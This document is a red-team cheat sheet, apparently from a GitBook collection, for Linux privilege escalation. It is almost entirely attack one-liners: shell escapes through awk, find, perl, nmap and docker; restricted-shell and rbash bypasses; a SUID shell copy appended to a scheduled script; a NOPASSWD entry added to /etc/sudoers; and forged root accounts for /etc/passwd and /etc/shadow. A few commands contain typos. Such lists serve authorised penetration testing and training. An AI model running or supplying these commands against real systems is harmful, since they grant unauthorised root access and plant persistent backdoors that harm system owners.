---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/privilege-escalation/linux
---

# Linux

```bash
!/bin/bash Privilege Escalation
==============================================================================
awk --> awk 'BEGIN {system{"/bin/bash"}}'
find --> find . -exec /bin/sh \; -quit;
perl --> perl -e 'exec "/bin/sh";'
nmap --> sudo nmap --script=/var/tmp/shell.nse
#echo "os.execute('/bin/bas')" > /var/tmp/shell.nse
docker --> docker image ls; docker run -v /:/mnt --rm -it alpine chroot /mnt sh

Jailed SSH Shell
==============================================================================
1. ssh test@10.10.10.10 "/bin/sh"
2. cd $HOME
3. mv .bashrc .bashrc.BAK 
4. exit
5. ssh test@10.10.10.10

Export PATH
==============================================================================
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear; ls -lsaht --color=auto'
Ctrl + z [Backgroup Process]
stty raw -echo; fg; reset
stty columns 200 rows 200

rbash bypass
==============================================================================
ssh -i id_rsa tom@$ip -t "bash --noprofile"
Type: vi
ESC -> :set shell=/bin/bash -> Enter -> :shell -> Enter

Restricted Shell
==============================================================================
echo os.system("/bin/bash")

Auto Scipt
==============================================================================
echo "cp /bin/dash /var/tmp/dash; chmod u+s /var/tmp/dash" >> backup.sh

Add sudoers
==============================================================================
echo 'user1 ALL=NOPASSWD: ALL' >> /etc/sudoers

Generate Hash with user (/etc/passwd)
==============================================================================
└─$ openssl passwd -1 -salt pass L@ughing1
$1$pass$8IGDfSQaDsZYGnWdXS.120
laughing:$1$pass$8IGDfSQaDsZYGnWdXS.120:0:0:root:/root:/bin/bash

Generate Hash with user (/etc/shadow)
==============================================================================
└─$ mkpasswd -m sha-512 password123    
$6$Kmnxa1cpu4AV/7tk$JWOgFN8CAugaDPsTMpYQbCNqdAFNBACYJ18n3mfhI/IKxItlD3EncsD2P/tUq0dNcX0oIWWCNaeQYMfI2STDK/
laughing:$6$Kmnxa1cpu4AV/7tk$JWOgFN8CAugaDPsTMpYQbCNqdAFNBACYJ18n3mfhI/IKxItlD3EncsD2P/tUq0dNcX0oIWWCNaeQYMfI2STDK/:0:0:root:/root:/bin/bash

Python
==============================================================================
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
